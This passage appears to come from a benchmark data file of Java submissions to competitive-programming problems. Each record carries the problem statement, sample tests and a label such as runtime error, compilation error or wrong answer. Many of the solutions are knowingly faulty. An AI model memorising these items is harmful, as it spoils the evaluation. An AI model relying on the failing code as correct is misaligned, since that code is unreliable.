m;\t\t\t\t\n\t\t\t}\n\t\t}\n\t\t\n\t\tout.println(t[N][M]);\n\t}\n\t\n\tpublic static void main(String args[])\n\t{\n\t\ttry\n\t\t{\n\t\t\t\/\/in = new Scanner(new File(\"in.txt\"));\n\t\t\t\/\/out = new PrintStream(new File(\"out.txt\"));\t\t\t\n\t\t\tin = new Scanner(System.in);\n\t\t\tout = System.out;\n\t\t}\n\t\tcatch (Exception e)\n\t\t{\n\t\t\treturn;\n\t\t}\n\t\t\n\t\t\n\t\ttest();\n\t}\n}\n","description":"You are given a sequence of balls A by your teacher, each labeled with a lowercase Latin letter 'a'-'z'. You don't like the given sequence. You want to change it into a new sequence, B that suits you better. So, you allow yourself four operations:  You can insert any ball with any label into the sequence at any position.  You can delete (remove) any ball from any position.  You can replace any ball with any other ball.  You can exchange (swap) two adjacent balls. Your teacher now places time constraints on each operation, meaning that an operation can only be performed in certain time. So, the first operation takes time ti, the second one takes td, the third one takes tr and the fourth one takes te. Also, it is given that 2\u00b7te\u2009\u2265\u2009ti\u2009+\u2009td.Find the minimal time to convert the sequence A to the sequence B.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains four space-separated integers ti,\u2009td,\u2009tr,\u2009te (0\u2009&lt;\u2009ti,\u2009td,\u2009tr,\u2009te\u2009\u2264\u2009100). The following two lines contain sequences A and B on separate lines. The length of each line is between 1 and 4000 characters inclusive.","output_spec":"Print a single integer representing minimum time to convert A into B.","notes":"NoteIn the second sample, you could delete the ball labeled 'a' from the first position and then insert another 'a' at the new second position with total time 6. However exchanging the balls give total time 3.","sample_inputs":["1 1 1 1\nyoushouldnot\nthoushaltnot","2 4 10 3\nab\nba","1 10 20 30\na\nza"],"sample_outputs":["5","3","1"]}
{"difficulty":2300,"lang":"Java 8","lang_cluster":"java","src_uid":"d2313888d962b1dd6dc21b5f1eb96f91","submission_id":"re_788","tags":["dp","number theory","greedy"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.io.*;\nimport java.util.*;\n\npublic class B implements Runnable {\n\n    private static final boolean ONLINE_JUDGE = System.getProperty(\"ONLINE_JUDGE\") != null;\n\n    private BufferedReader in;\n    private PrintWriter out;\n    private StringTokenizer tok = new StringTokenizer(\"\");\n\n    private void init() throws FileNotFoundException {\n        Locale.setDefault(Locale.US);\n        String fileName = \"\";\n        if (ONLINE_JUDGE && fileName.isEmpty()) {\n            in = new BufferedReader(new InputStreamReader(System.in));\n            out = new PrintWriter(System.out);\n        } else {\n            if (fileName.isEmpty()) {\n                in = new BufferedReader(new FileReader(\"input.txt\"));\n                out = new PrintWriter(\"output.txt\");\n            } else {\n                in = new BufferedReader(new FileReader(fileName + \".in\"));\n                out = new PrintWriter(fileName + \".out\");\n            }\n        }\n    }\n\n    String readString() {\n        while (!tok.hasMoreTokens()) {\n            try {\n                tok = new StringTokenizer(in.readLine());\n            } catch (Exception e) {\n                return null;\n            }\n        }\n        return tok.nextToken();\n    }\n\n    int readInt() {\n        return Integer.parseInt(readString());\n    }\n\n    long readLong() {\n        return Long.parseLong(readString());\n    }\n\n    double readDouble() {\n        return Double.parseDouble(readString());\n    }\n\n    int[] readIntArray(int size) {\n        int[] a = new int[size];\n        for (int i = 0; i < size; i++) {\n            a[i] = readInt();\n        }\n        return a;\n    }\n\n    public static void main(String[] args) {\n        \/\/new Thread(null, new _Solution(), \"\", 128 * (1L << 20)).start();\n        new B().run();\n    }\n\n    long timeBegin, timeEnd;\n\n    void time() {\n        timeEnd = System.currentTimeMillis();\n        System.err.println(\"Time = \" + (timeEnd - timeBegin));\n    }\n\n    @Override\n    public void run() {\n        try {\n            timeBegin = System.currentTimeMillis();\n            init();\n            solve();\n            out.close();\n            time();\n        } catch (Exception e) {\n            e.printStackTrace();\n            System.exit(-1);\n        }\n    }\n\n    int gcd(int a, int b) {\n        return a == 0 ? b : gcd(b % a, a);\n    }\n\n    long answer = Long.MAX_VALUE;\n\n    private void solve() {\n        int n = readInt();\n\n        int A = readInt();\n        int B = readInt();\n        int[] a = readIntArray(n);\n\n        for (int kFirst = -1; kFirst <= 1; kFirst++) {\n            int currentFirst = a[0] + kFirst;\n            for (int divisor = 2; divisor * divisor <= currentFirst; divisor++) {\n                if (currentFirst % divisor == 0) {\n                    answer = Math.min(answer, solveForPrefix(n, a, divisor, A, B));\n                }\n                while (currentFirst % divisor == 0) {\n                    currentFirst \/= divisor;\n                }\n            }\n            if (currentFirst > 1) {\n                answer = Math.min(answer, solveForPrefix(n, a, currentFirst, A, B));\n            }\n        }\n\n        int[] b = new int[n];\n        for (int i = 0; i < n; i++) {\n            b[i] = a[n - i - 1];\n        }\n\n        for (int kFirst = -1; kFirst <= 1; kFirst++) {\n            int currentFirst = b[0] + kFirst;\n            for (int divisor = 2; divisor * divisor <= currentFirst; divisor++) {\n                if (currentFirst % divisor == 0) {\n                    answer = Math.min(answer, solveForPrefix(n, b, divisor, A, B));\n                }\n                while (currentFirst % divisor == 0) {\n                    currentFirst \/= divisor;\n                }\n            }\n            if (currentFirst > 1) {\n                answer = Math.min(answer, solveForPrefix(n, b, currentFirst, A, B));\n            }\n        }\n        out.println(answer);\n    }\n\n    final int PREFIX = 0;\n    final int REMOVED = 1;\n    final int SUFFIX = 2;\n\n    long solveForPrefix(int n, int[] a, int gcd, int A, int B) {\n        long[][] dp = new long[3][n];\n        for (int i = 0; i < 3; i++) {\n            Arrays.fill(dp[i], Long.MAX_VALUE);\n        }\n        dp[PREFIX][0] = a[0] % gcd == 0 ? 0 : B;\n        for (int i = 1; i < n; i++) {\n            if (dp[PREFIX][i - 1] < Long.MAX_VALUE) {\n                if (a[i] % gcd != 0 && (a[i] - 1) % gcd != 0 && (a[i] + 1) % gcd != 0) {\n                    dp[PREFIX][i] = Long.MAX_VALUE;\n                } else {\n                    dp[PREFIX][i] = Math.min(dp[PREFIX][i], dp[PREFIX][i - 1] + (a[i] % gcd == 0 ? 0 : B));\n                }\n            }\n\n            if (dp[REMOVED][i - 1] < Long.MAX_VALUE) {\n                dp[REMOVED][i] = Math.min(dp[REMOVED][i], dp[REMOVED][i - 1] + A);\n            }\n            if (dp[PREFIX][i - 1] < Long.MAX_VALUE) {\n                dp[REMOVED][i] = Math.min(dp[REMOVED][i], dp[PREFIX][i - 1] + A);\n            }\n\n            if (dp[REMOVED][i - 1] < Long.MAX_VALUE) {\n                if (a[i] % gcd != 0 && (a[i] - 1) % gcd != 0 && (a[i] + 1) % gcd != 0) {\n                    dp[SUFFIX][i] = Long.MAX_VALUE;\n                } else {\n                    dp[SUFFIX][i] = Math.min(dp[SUFFIX][i], dp[REMOVED][i - 1] + (a[i] % gcd == 0 ? 0 : B));\n                }\n            }\n            if (dp[PREFIX][i - 1] < Long.MAX_VALUE) {\n                if (a[i] % gcd != 0 && (a[i] - 1) % gcd != 0 && (a[i] + 1) % gcd != 0) {\n                    dp[SUFFIX][i] = Long.MAX_VALUE;\n                } else {\n                    dp[SUFFIX][i] = Math.min(dp[SUFFIX][i], dp[PREFIX][i - 1] + (a[i] % gcd == 0 ? 0 : B));\n                }\n            }\n        }\n        return Math.min(dp[PREFIX][n - 1], Math.min(dp[REMOVED][n - 1], dp[SUFFIX][n - 1]));\n    }\n}\n","description":"You are given array ai of length n. You may consecutively apply two operations to this array:  remove some subsegment (continuous subsequence) of length m\u2009&lt;\u2009n and pay for it m\u00b7a coins;  change some elements of the array by at most 1, and pay b coins for each change. Please note that each of operations may be applied at most once (and may be not applied at all) so you can remove only one segment and each number may be changed (increased or decreased) by at most 1. Also note, that you are not allowed to delete the whole array.Your goal is to calculate the minimum number of coins that you need to spend in order to make the greatest common divisor of the elements of the resulting array be greater than 1.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains integers n, a and b (1\u2009\u2264\u2009n\u2009\u2264\u20091\u2009000\u2009000,\u20090\u2009\u2264\u2009a,\u2009b\u2009\u2264\u2009109)\u00a0\u2014 the length of the array, the cost of removing a single element in the first operation and the cost of changing an element, respectively. The second line contains n integers ai (2\u2009\u2264\u2009ai\u2009\u2264\u2009109)\u00a0\u2014 elements of the array.","output_spec":"Print a single number\u00a0\u2014 the minimum cost of changes needed to obtain an array, such that the greatest common divisor of all its elements is greater than 1.","notes":"NoteIn the first sample the optimal way is to remove number 3 and pay 1 coin for it.In the second sample you need to remove a segment [17,\u200913] and then decrease number 6. The cost of these changes is equal to 2\u00b73\u2009+\u20092\u2009=\u20098 coins.","sample_inputs":["3 1 4\n4 2 3","5 3 2\n5 17 13 5 6","8 3 4\n3 7 5 4 3 12 9 4"],"sample_outputs":["1","8","13"]}
{"difficulty":1900,"lang":"Java 11","lang_cluster":"java","src_uid":"d8d449d0fccf755822548ddf9d74b9ab","submission_id":"re_615","tags":["shortest paths","graphs"],"exec_outcome":"RUNTIME_ERROR","source_code":"import java.util.*;\nimport java.io.*;\npublic class Main {\n    static class Scan {\n        private byte[] buf=new byte[1024];\n        private int index;\n        private InputStream in;\n        private int total;\n        public Scan()\n        {\n            in=System.in;\n        }\n        public int scan()throws IOException\n        {\n            if(total<0)\n            throw new InputMismatchException();\n            if(index>=total)\n            {\n                index=0;\n                total=in.read(buf);\n                if(total<=0)\n                return -1;\n            }\n            return buf[index++];\n        }\n        public int scanInt()throws IOException\n        {\n            int integer=0;\n            int n=scan();\n            while(isWhiteSpace(n))\n            n=scan();\n            int neg=1;\n            if(n=='-')\n            {\n                neg=-1;\n                n=scan();\n            }\n            while(!isWhiteSpace(n))\n            {\n                if(n>='0'&&n<='9')\n                {\n                    integer*=10;\n                    integer+=n-'0';\n                    n=scan();\n                }\n                else throw new InputMismatchException();\n            }\n            return neg*integer;\n        }\n        public double scanDouble()throws IOException\n        {\n            double doub=0;\n            int n=scan();\n            while(isWhiteSpace(n))\n            n=scan();\n            int neg=1;\n            if(n=='-')\n            {\n                neg=-1;\n                n=scan();\n            }\n            while(!isWhiteSpace(n)&&n!='.')\n            {\n                if(n>='0'&&n<='9')\n                {\n                    doub*=10;\n                    doub+=n-'0';\n                    n=scan();\n                }\n                else throw new InputMismatchException();\n            }\n            if(n=='.')\n            {\n                n=scan();\n                double temp=1;\n                while(!isWhiteSpace(n))\n                {\n                    if(n>='0'&&n<='9')\n                    {\n                        temp\/=10;\n                        doub+=(n-'0')*temp;\n                        n=scan();\n                    }\n                    else throw new InputMismatchException();\n                }\n            }\n            return doub*neg;\n        }\n        public String scanString()throws IOException\n        {\n            StringBuilder sb=new StringBuilder();\n            int n=scan();\n            while(isWhiteSpace(n))\n            n=scan();\n            while(!isWhiteSpace(n))\n            {\n                sb.append((char)n);\n                n=scan();\n            }\n            return sb.toString();\n        }\n        private boolean isWhiteSpace(int n)\n        {\n            if(n==' '||n=='\\n'||n=='\\r'||n=='\\t'||n==-1)\n            return true;\n            return false;\n        }\n    }\n    \n    public static void sort(int arr[],int l,int r) {    \/\/sort(arr,0,n-1);\n        if(l==r) {\n            return;\n        }\n        int mid=(l+r)\/2;\n        sort(arr,l,mid);\n        sort(arr,mid+1,r);\n        merge(arr,l,mid,mid+1,r);\n    }\n    public static void merge(int arr[],int l1,int r1,int l2,int r2) {\n        int tmp[]=new int[r2-l1+1];\n        int indx1=l1,indx2=l2;\n        \/\/sorting the two halves using a tmp array\n        for(int i=0;i<tmp.length;i++) {\n            if(indx1>r1) {\n                tmp[i]=arr[indx2];\n                indx2++;\n                continue;\n            }\n            if(indx2>r2) {\n                tmp[i]=arr[indx1];\n                indx1++;\n                continue;\n            }\n            if(arr[indx1]<arr[indx2]) {\n                tmp[i]=arr[indx1];\n                indx1++;\n                continue;\n            }\n            tmp[i]=arr[indx2];\n            indx2++;\n        }\n        \/\/Copying the elements of tmp into the main array\n        for(int i=0,j=l1;i<tmp.length;i++,j++) {\n            arr[j]=tmp[i];\n        }\n    }\n    \n    public static void sort(long arr[],int l,int r) {    \/\/sort(arr,0,n-1);\n        if(l==r) {\n            return;\n        }\n        int mid=(l+r)\/2;\n        sort(arr,l,mid);\n        sort(arr,mid+1,r);\n        merge(arr,l,mid,mid+1,r);\n    }\n    public static void merge(long arr[],int l1,int r1,int l2,int r2) {\n        long tmp[]=new long[r2-l1+1];\n        int indx1=l1,indx2=l2;\n        \/\/sorting the two halves using a tmp array\n        for(int i=0;i<tmp.length;i++) {\n            if(indx1>r1) {\n                tmp[i]=arr[indx2];\n                indx2++;\n                continue;\n            }\n            if(indx2>r2) {\n                tmp[i]=arr[indx1];\n                indx1++;\n                continue;\n            }\n            if(arr[indx1]<arr[indx2]) {\n                tmp[i]=arr[indx1];\n                indx1++;\n                continue;\n            }\n            tmp[i]=arr[indx2];\n            indx2++;\n        }\n        \/\/Copying the elements of tmp into the main array\n        for(int i=0,j=l1;i<tmp.length;i++,j++) {\n            arr[j]=tmp[i];\n        }\n    }\n    \n    \n    \n    \n    \n    \n    \n    static class seg_tree {\n        long seg_tree[],seg_indx[];\n        public seg_tree(int n,long arr[]) {\n            seg_tree=new long[4*n];\n            seg_indx=new long[4*n];\n            create_seg_tree(arr,0,0,n-1);\n        }\n\n        \/\/0 index-Left child-(2*i+1) Right Child-(2*i+2)\n\n        public void create_seg_tree(long arr[],int vertex,int l,int r) {\n            if(l==r) {\n                seg_indx[vertex]=r;\n                seg_tree[vertex]=arr[r];\n                return;\n            }\n            int mid=(l+r)\/2;\n            \/\/Left Child\n            create_seg_tree(arr,(2*vertex)+1,l,mid);\n            \/\/Right Child\n            create_seg_tree(arr,(2*vertex)+2,mid+1,r);\n            \/\/Filling this node\n            if(seg_tree[(2*vertex)+1]<seg_tree[(2*vertex)+2]) {\n                seg_tree[vertex]=seg_tree[(2*vertex)+1];\n                seg_indx[vertex]=seg_indx[(2*vertex)+1];\n            }\n            else {\n                seg_tree[vertex]=seg_tree[(2*vertex)+2];\n                seg_indx[vertex]=seg_indx[(2*vertex)+2];\n            }\n        }\n\n        public long[] min(int vertex,int l,int r,int ql,int qr) {  \/\/ql->query left , qr-> query right l->curr Segmrnt left    r->curr segment right\n            if(ql>qr) {\n                return new long[]{Long.MAX_VALUE,-1};\n            }\n\n            if(ql==l && qr==r) {\n                return new long[]{seg_tree[vertex],seg_indx[vertex]};\n            }\n            int mid=(l+r)\/2;\n\n            \/\/Left Child\n            long min1[]=min((2*vertex)+1,l,mid,ql,Math.min(qr, mid));\n\n            \/\/Right Child\n            long min2[]=min((2*vertex)+2,mid+1,r,Math.max(mid+1,ql),qr);\n\n            if(min1[0]<min2[0]) {\n                return min1;\n            }\n            else {\n                return min2;\n            }\n        }\n\n        public void update(int vertex,int l,int r,int pos,long value) {   \/\/pos->Position of the update   value->updates value\n            if(l==r) {\n                seg_tree[vertex]=value;\n                return;\n            }\n            int mid=(l+r)\/2;\n            \/\/Left Child\n            if(pos<=mid) {\n                update((2*vertex)+1,l,mid,pos,value);\n            }\n            \/\/Right Child\n            else {\n                update((2*vertex)+2,mid+1,r,pos,value);\n            }\n            if(seg_tree[(2*vertex)+1]<seg_tree[(2*vertex)+2]) {\n                seg_tree[vertex]=seg_tree[(2*vertex)+1];\n                seg_indx[vertex]=seg_indx[(2*vertex)+1];\n            }\n            else {\n                seg_tree[vertex]=seg_tree[(2*vertex)+2];\n                seg_indx[vertex]=seg_indx[(2*vertex)+2];\n            }\n        }\n    }\n\n    \n    \n    \n    \n\n    static ArrayList<Integer> adj_lst[],weight[];\n    static int len[],cost[];\n    static boolean vis[];\n    static long dist[][],dp[][];\n    static int n,x,y;\n    static seg_tree s_tree;\n    public static void main(String args[]) throws IOException {\n        Scan input=new Scan();\n        n=input.scanInt();\n        int m=input.scanInt();\n        x=input.scanInt()-1;\n        y=input.scanInt()-1;\n        len=new int[n];\n        cost=new int[n];\n        adj_lst=new ArrayList[n];\n        weight=new ArrayList[n];\n        vis=new boolean[n];\n        dist=new long[n][n];\n        for(int i=0;i<n;i++) {\n            adj_lst[i]=new ArrayList<>();\n            weight[i]=new ArrayList<>();\n        }\n        for(int i=0;i<m;i++) {\n            int u=input.scanInt()-1;\n            int v=input.scanInt()-1;\n            int wei=input.scanInt();\n            adj_lst[u].add(v);\n            adj_lst[v].add(u);\n            weight[u].add(wei);\n            weight[v].add(wei);\n        }\n        for(int i=0;i<n;i++) {\n            len[i]=input.scanInt();\n            cost[i]=input.scanInt();\n        }\n        for(int i=0;i<n;i++) {\n            Arrays.fill(dist[i], Long.MAX_VALUE);\n            dist[i][i]=0;\n            s_tree=new seg_tree(n,dist[i]);\n            vis=new boolean[n];\n            Dijkstras(i,i);\n        }\n        dp=new long[n+1][n+1];\n        for(int i=0;i<dp.length;i++) {\n            for(int j=0;j<dp[0].length;j++) {\n                dp[i][j]=-1;\n            }\n        }\n        long ans=solve(x,0);\n        if(ans==Long.MAX_VALUE) {\n            ans=-1;\n        }\n        System.out.println(ans);\n    }\n    public static long solve(int root,int dep) {\n        if(dep>n) {\n            return Long.MAX_VALUE\/10;\n        }\n        if(root==y) {\n            return 0;\n        }\n        if(dp[root][dep]!=-1) {\n            return dp[root][dep];\n        }\n        long min=Long.MAX_VALUE;\n        for(int i=0;i<n;i++) {\n            if(i==root) {\n                continue;\n            }\n            if(dist[root][i]<=len[root]) {\n                min=Math.min(min,cost[root]+solve(i,dep+1));\n            }\n        }\n        dp[root][dep]=min;\n        return min;\n    }\n    public static void Dijkstras(int source,int root) {\n        vis[root]=true;\n        dist[source][root]=0;\n        while(true) {\n\/\/            System.out.println(root);\n            vis[root]=true;\n            for(int i=0;i<adj_lst[root].size();i++) {\n                if(vis[adj_lst[root].get(i)]) {\n                    continue;\n                }\n                if(dist[source][root]+weight[root].get(i)<dist[source][adj_lst[root].get(i)]) {\n                    dist[source][adj_lst[root].get(i)]=dist[source][root]+weight[root].get(i);\n                    s_tree.update(0, 0, n-1, adj_lst[root].get(i), dist[source][adj_lst[root].get(i)]);\n                }\n            }\n            s_tree.update(0, 0, n-1, root, Long.MAX_VALUE);\n            long tmp[]=s_tree.min(0, 0, n-1, 0, n-1);\n            if(tmp[0]==Long.MAX_VALUE) {\n                break;\n            }\n            root=(int)tmp[1];\n        }\n    }\n}\n","description":"Petya loves volleyball very much. One day he was running late for a volleyball match. Petya hasn't bought his own car yet, that's why he had to take a taxi. The city has n junctions, some of which are connected by two-way roads. The length of each road is defined by some positive integer number of meters; the roads can have different lengths.Initially each junction has exactly one taxi standing there. The taxi driver from the i-th junction agrees to drive Petya (perhaps through several intermediate junctions) to some other junction if the travel distance is not more than ti meters. Also, the cost of the ride doesn't depend on the distance and is equal to ci bourles. Taxis can't stop in the middle of a road. Each taxi can be used no more than once. Petya can catch taxi only in the junction, where it stands initially.At the moment Petya is located on the junction x and the volleyball stadium is on the junction y. Determine the minimum amount of money Petya will need to drive to the stadium.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and m (1\u2009\u2264\u2009n\u2009\u2264\u20091000,\u20090\u2009\u2264\u2009m\u2009\u2264\u20091000). They are the number of junctions and roads in the city correspondingly. The junctions are numbered from 1 to n, inclusive. The next line contains two integers x and y (1\u2009\u2264\u2009x,\u2009y\u2009\u2264\u2009n). They are the numbers of the initial and final junctions correspondingly. Next m lines contain the roads' description. Each road is described by a group of three integers ui, vi, wi (1\u2009\u2264\u2009ui,\u2009vi\u2009\u2264\u2009n,\u20091\u2009\u2264\u2009wi\u2009\u2264\u2009109) \u2014 they are the numbers of the junctions connected by the road and the length of the road, correspondingly. The next n lines contain n pairs of integers ti and ci (1\u2009\u2264\u2009ti,\u2009ci\u2009\u2264\u2009109), which describe the taxi driver that waits at the i-th junction \u2014 the maximum distance he can drive and the drive's cost. The road can't connect the junction with itself, but between a pair of junctions there can be more than one road. All consecutive numbers in each line are separated by exactly one space character.","output_spec":"If taxis can't drive Petya to the destination point, print \"-1\" (without the quotes). Otherwise, print the drive's minimum cost. Please do not use the %lld specificator to read or write 64-bit integers in \u0421++. It is preferred to use cin, cout streams or the %I64d specificator.","notes":"NoteAn optimal way \u2014 ride from the junction 1 to 2 (via junction 4), then from 2 to 3. It costs 7+2=9 bourles.","sample_inputs":["4 4\n1 3\n1 2 3\n1 4 1\n2 4 1\n2 3 5\n2 7\n7 2\n1 2\n7 7"],"sample_outputs":["9"]}
{"difficulty":2100,"lang":"Java 8","lang_cluster":"java","src_uid":"d9eb0f6f82bd09ea53a1dbbd7242c497","submission_id":"re_231","tags":["sortings","geometry"],"exec_outcome":"COMPILATION_ERROR","source_code":"import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.util.StringTokenizer;\n\nimport geometry.Point;\nimport geometry.Vector;\n\npublic class CF_166_B_POLYGONS {\n\n\tstatic final double EPS = 10e-10;\n\n\tstatic double angle(Point a, Point o, Point b) {\n\t\tVector oa = new Vector(o, a), ob = new Vector(o, b);\n\t\treturn Math.acos(oa.dot(ob) \/ Math.sqrt(oa.norm2() * ob.norm2()));\n\t}\n\n\tstatic boolean ccw(Point p, Point q, Point r) {\n\t\treturn new Vector(p, q).cross(new Vector(p, r)) > 0;\n\t}\n\n\tpublic static void main(String[] args) throws Exception {\n\t\tScanner sc = new Scanner(System.in);\n\n\t\tint n = sc.nextInt();\n\n\t\tPoint[] p = new Point[n + 1];\n\n\t\tfor (int i = 0; i < n; i++)\n\t\t\tp[i] = new Point(sc.nextDouble(), sc.nextDouble());\n\n\t\tp[n] = p[0];\n\n\t\tint m = sc.nextInt();\n\n\t\twhile (m-- > 0)\n\t\t\tif (!inPolygon(p, new Point(sc.nextDouble(), sc.nextDouble()))) {\n\t\t\t\tSystem.out.println(\"NO\");\n\t\t\t\treturn;\n\t\t\t}\n\n\t\tSystem.out.println(\"YES\");\n\n\t}\n\n\tstatic boolean inPolygon(Point[] p, Point target) {\n\t\tint low = 1;\n\t\tint high = p.length - 1;\n\n\t\tboolean ccw = crossPrdouct(p[0], p[1], p[p.length - 1]) == 1;\n\t\t\n\t\tif(!ccw)\n\t\t{\n\t\t\tint temp = low ;\n\t\t\tlow = high;\n\t\t\thigh = temp;\n\t\t\t\n\t\t}\n\t\t\n\t\twhile (Math.abs(low - high) > 1) {\n\t\t\t\tint mid = (low + high) \/2;\n\n\t\t\t\tif (crossPrdouct(p[0], p[mid], target) > 0)\n\t\t\t\t\tlow = mid;\n\t\t\t\telse\n\t\t\t\t\thigh = mid;\n\n\t\t\t}\n\t\t\n\t\t\n\t\treturn crossPrdouct(p[low], p[high],target ) >0;\n\t\t\n\n\t}\n\n\tstatic double crossPrdouct(Point p, Point q, Point r)\n\t{\n\t\tVector pq = new Vector(p, q);\n\t\tVector pr = new Vector(p, r);\n\t\tdouble cross = pq.cross(pr);\n\t\t\n\t\tif(Math.abs(cross) > EPS)\n\t\t\treturn cross > 0 ? 1 : -1;\n\t\t\n\t\treturn 0;\n\t\t\n\t\n\t}\n\n\tstatic class Vector {\n\n\t\tdouble x, y;\n\n\t\tVector(double a, double b) {\n\t\t\tx = a;\n\t\t\ty = b;\n\t\t}\n\n\t\tVector(Point a, Point b) {\n\t\t\tthis(b.x - a.x, b.y - a.y);\n\t\t}\n\n\t\tVector scale(double s) {\n\t\t\treturn new Vector(x * s, y * s);\n\t\t} \/\/ s is a non-negative value\n\n\t\tdouble dot(Vector v) {\n\t\t\treturn (x * v.x + y * v.y);\n\t\t}\n\n\t\tdouble cross(Vector v) {\n\t\t\treturn x * v.y - y * v.x;\n\t\t}\n\n\t\tdouble norm2() {\n\t\t\treturn x * x + y * y;\n\t\t}\n\n\t\tVector reverse() {\n\t\t\treturn new Vector(-x, -y);\n\t\t}\n\n\t\tVector normalize() {\n\t\t\tdouble d = Math.sqrt(norm2());\n\t\t\treturn scale(1 \/ d);\n\t\t}\n\t}\n\n\tstatic class Point implements Comparable<Point> {\n\n\t\tstatic final double EPS = 1e-9;\n\n\t\tdouble x, y;\n\n\t\tPoint(double a, double b) {\n\t\t\tx = a;\n\t\t\ty = b;\n\t\t}\n\n\t\tpublic int compareTo(Point p) {\n\t\t\tif (Math.abs(y - p.y) > EPS)\n\t\t\t\treturn y > p.y ? 1 : -1;\n\n\t\t\treturn 0;\n\t\t}\n\n\t\tpublic double dist(Point p) {\n\t\t\treturn Math.sqrt(sq(x - p.x) + sq(y - p.y));\n\t\t}\n\t\t\n\t\tboolean between(Point p, Point q)\n\t\t{\n\t\t\treturn x < Math.max(p.x, q.x) + EPS && x + EPS > Math.min(p.x, q.x)\n\t\t\t\t\t&& y < Math.max(p.y, q.y) + EPS && y + EPS > Math.min(p.y, q.y);\n\t\t}\n\n\t\tstatic double sq(double x) {\n\t\t\treturn x * x;\n\t\t}\n\n\t}\n\n\tstatic class Scanner {\n\t\tStringTokenizer st;\n\t\tBufferedReader br;\n\n\t\tpublic Scanner(InputStream s) {\n\t\t\tbr = new BufferedReader(new InputStreamReader(s));\n\t\t}\n\n\t\tpublic String next() throws IOException {\n\t\t\twhile (st == null || !st.hasMoreTokens())\n\t\t\t\tst = new StringTokenizer(br.readLine());\n\t\t\treturn st.nextToken();\n\t\t}\n\n\t\tpublic int nextInt() throws IOException {\n\t\t\treturn Integer.parseInt(next());\n\t\t}\n\n\t\tpublic long nextLong() throws IOException {\n\t\t\treturn Long.parseLong(next());\n\t\t}\n\n\t\tpublic String nextLine() throws IOException {\n\t\t\treturn br.readLine();\n\t\t}\n\n\t\tpublic double nextDouble() throws IOException {\n\t\t\tString x = next();\n\t\t\tStringBuilder sb = new StringBuilder(\"0\");\n\t\t\tdouble res = 0, f = 1;\n\t\t\tboolean dec = false, neg = false;\n\t\t\tint start = 0;\n\t\t\tif (x.charAt(0) == '-') {\n\t\t\t\tneg = true;\n\t\t\t\tstart++;\n\t\t\t}\n\t\t\tfor (int i = start; i < x.length(); i++)\n\t\t\t\tif (x.charAt(i) == '.') {\n\t\t\t\t\tres = Long.parseLong(sb.toString());\n\t\t\t\t\tsb = new StringBuilder(\"0\");\n\t\t\t\t\tdec = true;\n\t\t\t\t} else {\n\t\t\t\t\tsb.append(x.charAt(i));\n\t\t\t\t\tif (dec)\n\t\t\t\t\t\tf *= 10;\n\t\t\t\t}\n\t\t\tres += Long.parseLong(sb.toString()) \/ f;\n\t\t\treturn res * (neg ? -1 : 1);\n\t\t}\n\n\t\tpublic boolean ready() throws IOException {\n\t\t\treturn br.ready();\n\t\t}\n\n\t}\n\n}\n","description":"You've got another geometrical task. You are given two non-degenerate polygons A and B as vertex coordinates. Polygon A is strictly convex. Polygon B is an arbitrary polygon without any self-intersections and self-touches. The vertices of both polygons are given in the clockwise order. For each polygon no three consecutively following vertices are located on the same straight line.Your task is to check whether polygon B is positioned strictly inside polygon A. It means that any point of polygon B should be strictly inside polygon A. \"Strictly\" means that the vertex of polygon B cannot lie on the side of the polygon A.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains the only integer n (3\u2009\u2264\u2009n\u2009\u2264\u2009105) \u2014 the number of vertices of polygon A. Then n lines contain pairs of integers xi,\u2009yi (|xi|,\u2009|yi|\u2009\u2264\u2009109) \u2014 coordinates of the i-th vertex of polygon A. The vertices are given in the clockwise order. The next line contains a single integer m (3\u2009\u2264\u2009m\u2009\u2264\u20092\u00b7104) \u2014 the number of vertices of polygon B. Then following m lines contain pairs of integers xj,\u2009yj (|xj|,\u2009|yj|\u2009\u2264\u2009109) \u2014 the coordinates of the j-th vertex of polygon B. The vertices are given in the clockwise order. The coordinates of the polygon's vertices are separated by a single space. It is guaranteed that polygons A and B are non-degenerate, that polygon A is strictly convex, that polygon B has no self-intersections and self-touches and also for each polygon no three consecutively following vertices are located on the same straight line.","output_spec":"Print on the only line the answer to the problem \u2014 if polygon B is strictly inside polygon A, print \"YES\", otherwise print \"NO\" (without the quotes).","notes":null,"sample_inputs":["6\n-2 1\n0 3\n3 3\n4 1\n3 -2\n2 -2\n4\n0 1\n2 2\n3 1\n1 0","5\n1 2\n4 2\n3 -3\n-2 -2\n-2 1\n4\n0 1\n1 2\n4 1\n2 -1","5\n-1 2\n2 3\n4 1\n3 -2\n0 -3\n5\n1 0\n1 1\n3 1\n5 -1\n2 -1"],"sample_outputs":["YES","NO","NO"]}
{"difficulty":2300,"lang":"Java 8","lang_cluster":"java","src_uid":"db853d598b638dcdeaea5a26ae83758b","submission_id":"re_477","tags":["string suffix structures"],"exec_outcome":"WRONG_ANSWER","source_code":"import java.io.*;\nimport java.util.*;\nimport java.util.Map.Entry;\npublic class CF123_D1_D{\n\tpublic static void main(String[] args)throws Throwable {\n\t\tMyScanner sc=new MyScanner();\n\t\tPrintWriter pw=new PrintWriter(System.out);\n\t\t\n\t\tchar [] s=sc.next().toCharArray();\n\t\tSA=new SuffixAutomaton(s);\n\t\tint n=SA.idx+1;\n\t\tacceptState=new boolean [n];\n\t\tint cur=SA.idx;\n\t\twhile(true){\n\t\t\tacceptState[cur]=true;\n\t\t\tif(cur==0)\n\t\t\t\tbreak;\n\t\t\tcur=SA.link[cur];\n\t\t}\n\t\tcnt=new long [n];\n\t\tArrays.fill(cnt, -1);\n\t\tlong ans=0;\n\t\tfor(int i=0;i<=SA.idx;i++){\n\t\t\tlong x=dfs(i);\n\t\t\tint cnt=SA.len[i]-SA.len[SA.link[i]];\n\t\t\tans+=x*(x+1)*cnt\/2;\n\t\t}\n\t\tpw.println(ans);\n\t\tpw.flush();\n\t\tpw.close();\n\t}\n\tstatic SuffixAutomaton SA;\n\tstatic boolean [] acceptState;\n\tstatic long [] cnt;\n\t\n\tstatic long dfs(int u){\n\t\tif(cnt[u]!=-1)\n\t\t\treturn cnt[u];\n\t\tlong ans=acceptState[u]? 1 : 0;\n\t\tfor(Entry<Character, Integer> e : SA.nxt[u].entrySet()){\n\t\t\tint v=e.getValue();\n\t\t\tans+=dfs(v);\n\t\t}\n\t\treturn 